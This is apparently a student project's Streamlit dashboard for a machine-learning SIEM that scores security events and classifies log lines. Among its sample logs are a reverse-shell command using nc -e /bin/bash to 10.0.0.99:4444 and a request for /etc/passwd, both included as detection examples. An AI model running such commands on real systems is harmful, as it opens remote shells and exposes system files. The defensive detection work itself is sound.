import streamlit as st
import pandas as pd
import numpy as np
import joblib
import os
import time
import torch
import torch.nn as nn
import plotly.express as px
import plotly.graph_objects as go

# ── Page config ───────────────────────────────────────────
st.set_page_config(
    page_title="SIEM Intelligent",
    page_icon="🛡️",
    layout="wide",
)

DEVICE = torch.device("cuda" if torch.cuda.is_available() else "cpu")
MODEL_DIR = "models"
DATA_DIR = "data/processed"


class Autoencoder(nn.Module):
    def __init__(self, input_dim, latent_dim=16):
        super().__init__()
        self.encoder = nn.Sequential(
            nn.Linear(input_dim, 64), nn.ReLU(),
            nn.Linear(64, 32), nn.ReLU(),
            nn.Linear(32, latent_dim),
        )
        self.decoder = nn.Sequential(
            nn.Linear(latent_dim, 32), nn.ReLU(),
            nn.Linear(32, 64), nn.ReLU(),
            nn.Linear(64, input_dim),
        )

    def forward(self, x):
        return self.decoder(self.encoder(x))


class LSTMDetector(nn.Module):
    def __init__(self, input_dim, hidden_dim=64, num_layers=2, dropout=0.3):
        super().__init__()
        self.lstm = nn.LSTM(
            input_size=input_dim, hidden_size=hidden_dim,
            num_layers=num_layers, batch_first=True,
            dropout=dropout if num_layers > 1 else 0.0
        )
        self.classifier = nn.Sequential(
            nn.Linear(hidden_dim, 32), nn.ReLU(),
            nn.Dropout(dropout), nn.Linear(32, 1)
        )

    def forward(self, x):
        _, (h_n, _) = self.lstm(x)
        return self.classifier(h_n[-1]).squeeze(-1)


@st.cache_resource
def load_artifacts():
    """Load all trained models + scaler + test data. Returns dict, skips missing files."""
    artifacts = {}

    # Scaler
    path = f"{MODEL_DIR}/scaler.pkl"
    artifacts["scaler"] = joblib.load(path) if os.path.exists(path) else None

    # Feature names
    fn_path = f"{DATA_DIR}/feature_names.csv"
    artifacts["feature_names"] = (
        pd.read_csv(fn_path)["0"].tolist() if os.path.exists(fn_path) else None
    )

    # Isolation Forest
    path = f"{MODEL_DIR}/isolation_forest.pkl"
    artifacts["iforest"] = joblib.load(path) if os.path.exists(path) else None

    # Autoencoder
    path = f"{MODEL_DIR}/autoencoder.pt"
    if os.path.exists(path) and artifacts["feature_names"] is not None:
        input_dim = len(artifacts["feature_names"])
        ae = Autoencoder(input_dim)
        ae.load_state_dict(torch.load(path, map_location=DEVICE))
        ae.eval()
        artifacts["autoencoder"] = ae
    else:
        artifacts["autoencoder"] = None

    # LSTM
    path = f"{MODEL_DIR}/lstm_detector.pt"
    if os.path.exists(path) and artifacts["feature_names"] is not None:
        input_dim = len(artifacts["feature_names"])
        lstm = LSTMDetector(input_dim)
        lstm.load_state_dict(torch.load(path, map_location=DEVICE))
        lstm.eval()
        artifacts["lstm"] = lstm
    else:
        artifacts["lstm"] = None

    # Test data (for replay simulation)
    x_path = f"{DATA_DIR}/X_test.npy"
    y_path = f"{DATA_DIR}/y_test.npy"
    if os.path.exists(x_path):
        artifacts["X_test"] = np.load(x_path)
        artifacts["y_test"] = np.load(y_path)
    else:
        artifacts["X_test"] = None
        artifacts["y_test"] = None

    # NLP models
    tfidf_path = f"{MODEL_DIR}/tfidf_logreg.pkl"
    artifacts["tfidf"] = joblib.load(
        tfidf_path) if os.path.exists(tfidf_path) else None

    bert_path = f"{MODEL_DIR}/bert_log_classifier"
    if os.path.exists(bert_path):
        from transformers import AutoTokenizer, AutoModelForSequenceClassification
        artifacts["bert_tokenizer"] = AutoTokenizer.from_pretrained(bert_path)
        artifacts["bert_model"] = AutoModelForSequenceClassification.from_pretrained(
            bert_path).to(DEVICE)
        artifacts["bert_model"].eval()
    else:
        artifacts["bert_tokenizer"] = None
        artifacts["bert_model"] = None

    return artifacts


ID2LABEL_NLP = {0: "normal", 1: "suspicious", 2: "critical"}


def score_isolation_forest(art, X):
    if art["iforest"] is None:
        return None
    raw = art["iforest"].decision_function(X)
    return -raw  # higher = more anomalous


def score_autoencoder(art, X):
    if art["autoencoder"] is None:
        return None
    with torch.no_grad():
        t = torch.FloatTensor(X)
        recon = art["autoencoder"](t).numpy()
    return np.mean((X - recon) ** 2, axis=1)


def score_lstm(art, X, seq_len=10):
    if art["lstm"] is None or len(X) < seq_len:
        return None
    seqs = []
    for i in range(len(X) - seq_len + 1):
        seqs.append(X[i:i + seq_len])
    seqs = np.array(seqs, dtype=np.float32)
    with torch.no_grad():
        logits = art["lstm"](torch.FloatTensor(seqs))
    scores = torch.sigmoid(logits).numpy()
    # pad the first seq_len-1 entries with the first score so length matches X
    pad = np.full(seq_len - 1, scores[0])
    return np.concatenate([pad, scores])


def normalize(arr):
    if arr is None:
        return None
    arr = np.asarray(arr, dtype=float)
    lo, hi = np.percentile(arr, 1), np.percentile(arr, 99)
    if hi - lo < 1e-9:
        return np.zeros_like(arr)
    return np.clip((arr - lo) / (hi - lo), 0, 1)


def predict_log_nlp(text, art):
    if art["bert_model"] is not None and art["bert_tokenizer"] is not None:
        enc = art["bert_tokenizer"](
            text, return_tensors="pt", max_length=128,
            truncation=True, padding="max_length"
        ).to(DEVICE)
        with torch.no_grad():
            logits = art["bert_model"](**enc).logits
        probs = torch.softmax(logits, dim=-1).cpu().numpy()[0]
        pred_id = int(probs.argmax())
        return ID2LABEL_NLP[pred_id], float(probs[pred_id])
    elif art["tfidf"] is not None:
        proba = art["tfidf"].predict_proba([text])[0]
        classes = art["tfidf"].classes_
        pred = classes[proba.argmax()]
        return pred, float(proba.max())
    return "unknown", 0.0


st.title("🛡️ SIEM Intelligent — Dashboard")
st.caption(
    "Détection d'anomalies avec ML, IA et NLP — PFE Licence IA & Data Science")

art = load_artifacts()

with st.sidebar:
    st.header("⚙️ Configuration")

    missing = []
    if art["iforest"] is None:
        missing.append("Isolation Forest")
    if art["autoencoder"] is None:
        missing.append("Autoencoder")
    if art["lstm"] is None:
        missing.append("LSTM")
    if art["X_test"] is None:
        missing.append("Données de test (X_test.npy)")

    if missing:
        st.warning("⚠️ Modèles/données manquants :\n" +
                   "\n".join(f"- {m}" for m in missing))
        st.caption(
            "Lance les notebooks 1 et 2 pour générer ces fichiers, puis recharge la page.")

    st.subheader("Modèles actifs")
    use_if = st.checkbox(
        "Isolation Forest", value=art["iforest"] is not None, disabled=art["iforest"] is None)
    use_ae = st.checkbox(
        "Autoencoder",      value=art["autoencoder"] is not None, disabled=art["autoencoder"] is None)
    use_lstm = st.checkbox(
        "LSTM",             value=art["lstm"] is not None, disabled=art["lstm"] is None)

    st.subheader("Seuil d'alerte")
    threshold = st.slider("Score de risque minimum", 0.0, 1.0, 0.5, 0.05)

    st.subheader("Simulation")
    n_events = st.slider("Nombre d'événements à afficher", 50, 1000, 200, 50)
    auto_refresh = st.checkbox("Rafraîchissement auto (5s)", value=False)


if art["X_test"] is not None:
    X = art["X_test"][:n_events]
    y = art["y_test"][:n_events]

    scores_if = normalize(score_isolation_forest(art, X)) if use_if else None
    scores_ae = normalize(score_autoencoder(art, X)) if use_ae else None
    scores_lstm = normalize(score_lstm(art, X)) if use_lstm else None

    active_scores = [s for s in [scores_if,
                                 scores_ae, scores_lstm] if s is not None]

    if active_scores:
        combined = np.mean(active_scores, axis=0)
    else:
        combined = np.zeros(len(X))

    df_events = pd.DataFrame({
        "event_id": range(len(X)),
        "true_label": y,
        "risk_score": combined,
        "alert": combined > threshold,
    })
    if scores_if is not None:
        df_events["score_iforest"] = scores_if
    if scores_ae is not None:
        df_events["score_autoencoder"] = scores_ae
    if scores_lstm is not None:
        df_events["score_lstm"] = scores_lstm

else:
    df_events = pd.DataFrame()


col1, col2, col3, col4 = st.columns(4)

if not df_events.empty:
    n_alerts = int(df_events["alert"].sum())
    n_total = len(df_events)
    n_true_attacks = int(df_events["true_label"].sum())
    avg_risk = df_events["risk_score"].mean()

    col1.metric("Événements analysés", f"{n_total:,}")
    col2.metric("Alertes déclenchées",
                f"{n_alerts:,}", delta=f"{n_alerts/n_total*100:.1f}%")
    col3.metric("Vraies attaques (test)", f"{n_true_attacks:,}")
    col4.metric("Score de risque moyen", f"{avg_risk:.2f}")
else:
    col1.metric("Événements analysés", "—")
    col2.metric("Alertes déclenchées", "—")
    col3.metric("Vraies attaques (test)", "—")
    col4.metric("Score de risque moyen", "—")
    st.info("📁 Aucune donnée trouvée. Lance d'abord les notebooks 1 et 2 pour générer "
            "`data/processed/X_test.npy` et les modèles dans `models/`.")


st.divider()


left, right = st.columns([2, 1])

with left:
    st.subheader("📈 Timeline des scores de risque")
    if not df_events.empty:
        fig = go.Figure()
        fig.add_trace(go.Scatter(
            x=df_events["event_id"], y=df_events["risk_score"],
            mode="lines", name="Score de risque combiné",
            line=dict(color="#534AB7", width=1.5),
        ))
        fig.add_hline(y=threshold, line_dash="dash", line_color="#D85A30",
                      annotation_text=f"Seuil = {threshold}")

        # Highlight true attacks
        attacks = df_events[df_events["true_label"] == 1]
        fig.add_trace(go.Scatter(
            x=attacks["event_id"], y=attacks["risk_score"],
            mode="markers", name="Vraie attaque",
            marker=dict(color="#D85A30", size=6, symbol="x"),
        ))

        fig.update_layout(
            xaxis_title="ID événement", yaxis_title="Score de risque (0-1)",
            height=380, margin=dict(l=10, r=10, t=10, b=10),
            legend=dict(orientation="h", yanchor="bottom",
                        y=1.02, xanchor="right", x=1),
        )
        st.plotly_chart(fig, use_container_width=True)
    else:
        st.empty()

    st.subheader("🚨 Flux d'alertes en temps réel")
    if not df_events.empty:
        alerts_df = df_events[df_events["alert"]].copy()
        alerts_df["severity"] = pd.cut(
            alerts_df["risk_score"], bins=[0, 0.65, 0.85, 1.0],
            labels=["Moyen", "Élevé", "Critique"]
        )

        def color_severity(val):
            colors = {"Moyen": "#FEF3C7",
                      "Élevé": "#FED7AA", "Critique": "#FECACA"}
            return f"background-color: {colors.get(val, '')}"

        if not alerts_df.empty:
            display_cols = ["event_id", "risk_score", "severity", "true_label"]
            styled = alerts_df[display_cols].tail(15).iloc[::-1].style.map(
                color_severity, subset=["severity"]
            ).format({"risk_score": "{:.3f}"})
            st.dataframe(styled, use_container_width=True, height=320)
        else:
            st.success("✅ Aucune alerte — tout est calme.")
    else:
        st.empty()


with right:
    st.subheader("🥧 Répartition des alertes")
    if not df_events.empty and df_events["alert"].sum() > 0:
        alerts_df = df_events[df_events["alert"]].copy()
        alerts_df["severity"] = pd.cut(
            alerts_df["risk_score"], bins=[0, 0.65, 0.85, 1.0],
            labels=["Moyen", "Élevé", "Critique"]
        )
        pie_data = alerts_df["severity"].value_counts().reset_index()
        pie_data.columns = ["severity", "count"]
        fig_pie = px.pie(
            pie_data, names="severity", values="count",
            color="severity",
            color_discrete_map={"Moyen": "#FBBF24",
                                "Élevé": "#FB923C", "Critique": "#EF4444"},
            hole=0.4,
        )
        fig_pie.update_layout(height=280, margin=dict(l=10, r=10, t=10, b=10))
        st.plotly_chart(fig_pie, use_container_width=True)
    else:
        st.info("Aucune alerte à afficher.")

    st.subheader("🔍 Contribution par modèle")
    if not df_events.empty:
        model_cols = [c for c in df_events.columns if c.startswith("score_")]
        if model_cols:
            avg_scores = df_events[model_cols].mean().reset_index()
            avg_scores.columns = ["model", "avg_score"]
            avg_scores["model"] = avg_scores["model"].str.replace("score_", "")
            fig_bar = px.bar(
                avg_scores, x="model", y="avg_score",
                color="model",
                color_discrete_sequence=["#534AB7", "#1D9E75", "#D85A30"],
            )
            fig_bar.update_layout(height=250, showlegend=False,
                                  margin=dict(l=10, r=10, t=10, b=10),
                                  yaxis_title="Score moyen")
            st.plotly_chart(fig_bar, use_container_width=True)
        else:
            st.info("Active au moins un modèle dans la sidebar.")

    st.subheader("🎯 Performance globale")
    if not df_events.empty:
        from sklearn.metrics import precision_score, recall_score, f1_score
        y_true = df_events["true_label"]
        y_pred = df_events["alert"].astype(int)
        if y_true.sum() > 0:
            p = precision_score(y_true, y_pred, zero_division=0)
            r = recall_score(y_true, y_pred, zero_division=0)
            f1 = f1_score(y_true, y_pred, zero_division=0)
            st.metric("Précision", f"{p:.2%}")
            st.metric("Rappel (Recall)", f"{r:.2%}")
            st.metric("F1-score", f"{f1:.2%}")
        else:
            st.info("Pas d'attaques dans cet échantillon.")


st.divider()


st.subheader("📝 Analyse NLP — Classification de logs")

if art["bert_model"] is None and art["tfidf"] is None:
    st.info("Aucun modèle NLP trouvé. Lance le notebook 3 pour générer "
            "`models/tfidf_logreg.pkl` ou `models/bert_log_classifier/`.")
else:
    sample_logs = [
        "sshd[1234]: Accepted password for alice from 192.168.1.10 port 22 ssh2",
        "sshd[9999]: Failed password for root from 1.2.3.4 port 22 ssh2 (repeated 100x)",
        'nginx: "GET /etc/passwd HTTP/1.1" 200 4096',
        "sudo: eve COMMAND=/bin/nc -e /bin/bash 10.0.0.99 4444",
        "kernel: DENY IN=eth0 SRC=203.0.113.5 DST=10.0.0.1 DPT=3389",
    ]

    col_a, col_b = st.columns([2, 1])
    with col_a:
        log_input = st.text_area(
            "Coller une ligne de log à analyser",
            value=sample_logs[0],
            height=80,
        )
    with col_b:
        st.write("**Exemples rapides :**")
        for i, sample in enumerate(sample_logs):
            if st.button(f"Exemple {i+1}", key=f"sample_{i}", use_container_width=True):
                log_input = sample

    if st.button("🔍 Analyser le log", type="primary"):
        label, confidence = predict_log_nlp(log_input, art)
        severity_colors = {"normal": "🟢", "suspicious": "🟡", "critical": "🔴"}
        st.markdown(
            f"### {severity_colors.get(label, '⚪')} **{label.upper()}** — confiance {confidence:.0%}")
        st.code(log_input, language="text")


st.divider()
st.caption("🛡️ SIEM Intelligent — Projet de Fin d'Études · IA & Data Science · "
           f"Device: {DEVICE}")


if auto_refresh:
    time.sleep(5)
    st.rerun()
